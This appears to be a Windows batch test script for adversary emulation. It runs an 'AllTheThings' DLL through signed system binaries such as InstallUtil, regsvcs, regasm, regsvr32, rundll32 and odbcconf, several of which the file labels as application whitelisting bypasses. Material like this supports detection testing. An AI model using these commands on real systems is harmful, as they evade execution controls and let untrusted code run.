::Chain Reaction - Cyclotron
::
:: In this test we will executing a binary multiple ways.
:: Some of these are Application Whitelisting Bypasses
:: Either Clone the Repo, or Download the AllTheThings DLL Somehow ;-)


REM X86
Executing X86 AllTheThings Test
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThingsx86.dll
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe AllTheThingsx86.dll
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U AllTheThingsx86.dll
regsvr32.exe /s /u AllTheThingsx86.dll
regsvr32.exe /s AllTheThingsx86.dll
rundll32 AllTheThingsx86.dll,EntryPoint
odbcconf.exe  /s /a { REGSVR AllTheThingsx86.dll }
regsvr32.exe /s /n /i:"Some String To Do Things ;-)" AllTheThingsx86.dll


REM AMD64

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThingsx64.dll
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe AllTheThingsx64.dll
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U AllTheThingsx64.dll
regsvr32.exe /s /u AllTheThingsx64.dll
regsvr32.exe /s AllTheThingsx64.dll
rundll32 AllTheThingsx64.dll,EntryPoint
odbcconf.exe  /s /a { REGSVR AllTheThingsx64.dll }
regsvr32.exe /s /n /i:"Some String To Do Things ;-)" AllTheThingsx64.dll
